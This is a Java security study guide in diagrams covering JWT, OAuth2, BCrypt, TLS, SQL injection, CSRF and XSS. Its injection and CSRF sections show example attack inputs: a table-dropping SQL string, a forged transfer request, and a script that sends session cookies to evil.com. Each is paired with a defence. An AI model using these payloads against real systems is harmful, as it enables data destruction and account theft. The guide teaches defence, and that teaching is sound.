# Java Security — Diagram Explanations

---

## 1. Authentication vs Authorization Flow

```
USER                         SERVER
 |                              |
 |-- POST /login (user+pass) -->|
 |                              |-- Verify credentials (Authentication)
 |                              |   "Who are you?"
 |<-- 200 OK + JWT token -------|
 |                              |
 |-- GET /admin (JWT token) --->|
 |                              |-- Decode JWT
 |                              |-- Check roles (Authorization)
 |                              |   "Are you allowed to do this?"
 |                              |
 |<-- 200 OK (if ADMIN role) ---|
 |<-- 403 Forbidden (if not) ---|

Authentication: happens at login — establishes identity
Authorization:  happens at every request — checks permission
```

---

## 2. JWT Structure (header.payload.signature)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    <- HEADER (Base64URL)
.
eyJzdWIiOiJ1c2VyMTIzIiwicm9sZXMiOlsiVVNFUiIsIkFETUlOIl0sImV4cCI6MTcwMDAwMDAwMH0=
                                          <- PAYLOAD (Base64URL)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                                          <- SIGNATURE (HMACSHA256)

HEADER decoded:
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD decoded:
{
  "sub": "user123",
  "roles": ["USER", "ADMIN"],
  "iat": 1699000000,      <- issued at
  "exp": 1700000000       <- expiry
}

SIGNATURE = HMACSHA256(
  base64url(header) + "." + base64url(payload),
  SECRET_KEY
)

Verification:
  Server recomputes the signature using its secret key.
  If it matches the signature in the token, the token is genuine.
  The payload (claims) are trusted only if signature is valid.

  NOTE: JWT is NOT encrypted — payload is only Base64 encoded.
  Anyone can decode and read the payload.
  Do NOT put sensitive data (password, SSN) in JWT payload.
```

---

## 3. OAuth2 Authorization Code Flow

```
  User     Browser      Your App        Auth Server      Resource Server
   |          |              |               |                  |
   |--clicks--|              |               |                  |
   | "Login   |              |               |                  |
   |  with    |              |               |                  |
   |  Google" |              |               |                  |
   |          |--redirect--->|               |                  |
   |          |   (app       |               |                  |
   |          |   redirects  |               |                  |
   |          |   to Google) |               |                  |
   |          |<-------------|               |                  |
   |          |--GET /authorize (client_id, redirect_uri, scope, state)-->|
   |          |<-- Google login page ---------|                  |
   |--login---|              |               |                  |
   |  on      |              |               |                  |
   |  Google  |              |               |                  |
   |          |<--redirect + auth_code -------|                  |
   |          |-- POST /token (auth_code) -->|                  |
   |          |  (your app exchanges code)   |                  |
   |          |<-- access_token + refresh_token                  |
   |          |              |               |                  |
   |          |              |--GET /userinfo (access_token)---->|
   |          |              |<-- user data ----------------------|
   |          |<-- logged in |               |                  |

Key points:
- User credentials never go to your app
- Auth code is single-use, short-lived
- Access token is short-lived (minutes to hours)
- Refresh token is long-lived (days to months) for getting new access tokens
```

---

## 4. SQL Injection — Safe vs Unsafe Query

```
UNSAFE (String concatenation):
  Input: username = "admin' OR '1'='1"

  Query built:
  SELECT * FROM users WHERE username = 'admin' OR '1'='1'
                                                ^^^^^^^^^
                                                Always true!
                                                Returns ALL users

  Worse:
  Input: "'; DROP TABLE users; --"
  Query: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
                                                  ^^^^^^^^^^^^^^^^^
                                                  Executes DROP TABLE!

SAFE (PreparedStatement):
  Query template: SELECT * FROM users WHERE username = ?

  The ? is a placeholder. The DB compiles the query structure FIRST,
  then binds the user input as data — it can NEVER become part of the command.

  Input "admin' OR '1'='1" is treated as a literal string to search for,
  not as SQL syntax. No injection possible.

  Java:
  PreparedStatement ps = conn.prepareStatement(
      "SELECT * FROM users WHERE username = ? AND password = ?"
  );
  ps.setString(1, username);   // bound as data
  ps.setString(2, password);   // bound as data
  ResultSet rs = ps.executeQuery();
```

---

## 5. BCrypt Hashing — Why Rainbow Tables Fail

```
WITHOUT SALT (MD5/SHA1 — broken):
  password123 --> MD5 --> 482c811da5d5b4bc6d497ffa98491e38
  password123 --> MD5 --> 482c811da5d5b4bc6d497ffa98491e38  (always same!)

  Attacker builds a rainbow table:
  "password123" -> "482c811..."
  "hello123"    -> "7b4f..."
  ...millions of entries...
  Stolen hash looked up in table -> instant crack

WITH BCrypt (salted):
  password123 + random_salt_1 --> BCrypt --> $2a$12$abc...xyz (unique hash 1)
  password123 + random_salt_2 --> BCrypt --> $2a$12$def...uvw (unique hash 2)

  Same password produces DIFFERENT hash every time!
  Rainbow tables are useless because every hash has a unique salt.
  The salt is stored IN the hash string itself (prefixed).

BCrypt hash anatomy:
  $2a $ 12 $ [22-char salt][31-char hash]
   |    |
   |    cost factor (2^12 = 4096 iterations)
  version

Brute force cost:
  cost=10: ~100ms per hash
  cost=12: ~400ms per hash
  cost=14: ~1.5s per hash
  For an attacker trying billions of passwords, this is prohibitive.
```

---

## 6. HTTPS TLS Handshake

```
CLIENT                              SERVER
  |                                    |
  |-- ClientHello (TLS version,        |
  |   cipher suites, random bytes) --->|
  |                                    |
  |<-- ServerHello (chosen cipher,     |
  |    server random, session ID) -----|
  |<-- Certificate (server's public key|
  |    signed by a trusted CA) --------|
  |<-- ServerHelloDone ----------------|
  |                                    |
  |-- Verify certificate with CA root  |
  |   (is this really the server?)     |
  |                                    |
  |-- ClientKeyExchange (pre-master    |
  |   secret encrypted with           |
  |   server's public key) ----------->|
  |                                    |
  |   Both sides derive session keys   |
  |   from: client_random +            |
  |          server_random +           |
  |          pre-master_secret         |
  |                                    |
  |-- ChangeCipherSpec + Finished ---->|
  |<-- ChangeCipherSpec + Finished ----|
  |                                    |
  |====== Encrypted communication ====|

After handshake: all data is encrypted with symmetric session keys.
Public key encryption is only used to establish the symmetric key.
Symmetric encryption (AES) is used for the actual data — much faster.
```

---

## 7. CSRF Attack Flow + Prevention Token

```
ATTACK FLOW (without CSRF protection):

  1. User logs into bank.com — browser has session cookie
  2. User visits evil.com
  3. evil.com page contains:
     <img src="https://bank.com/transfer?to=hacker&amount=5000">
  4. Browser makes request to bank.com with session cookie automatically!
  5. Bank sees valid session and executes transfer

PREVENTION WITH CSRF TOKEN:

  Bank generates a unique, random token per session:
  csrfToken = "a3f9d2...randomUnpredictable"

  Every form includes this token:
  <input type="hidden" name="_csrf" value="a3f9d2...">

  Server validates on every state-changing request:
  If request._csrf != session.csrfToken -> 403 Forbidden

  evil.com CANNOT include the correct token because:
  - Same-origin policy prevents evil.com from reading bank.com's DOM
  - The token is unpredictable — cannot be guessed

  SameSite cookie attribute (modern approach):
  Set-Cookie: sessionId=abc; SameSite=Strict
  Browser will NOT send the cookie on cross-site requests at all.
```

---

## 8. XSS Attack Flow + Prevention

```
STORED XSS:

  1. Attacker posts a comment:
     <script>document.location='https://evil.com/steal?c='+document.cookie</script>

  2. Server stores this in DB without sanitizing

  3. Every user who loads the comments page gets this script executed:
     - Their session cookie is sent to evil.com
     - Attacker now has their session — full account takeover

REFLECTED XSS:

  1. Attacker crafts a URL:
     https://legit.com/search?q=<script>alert(document.cookie)</script>

  2. Page renders: "Search results for: <script>..."
     If not escaped, the script executes in the victim's browser

PREVENTION:

  Output encoding (most important):
  User input "hello <world>"
  Must be rendered as: "hello &lt;world&gt;"

  In Java:
  // Thymeleaf auto-escapes by default: th:text="${userInput}"
  // vs th:utext (unescaped — use only for trusted HTML)

  // OWASP Java Encoder:
  String safe = Encode.forHtml(userInput);

  Content Security Policy (defense in depth):
  Content-Security-Policy: default-src 'self'; script-src 'self'
  Browser refuses to execute inline scripts or scripts from other domains.
```
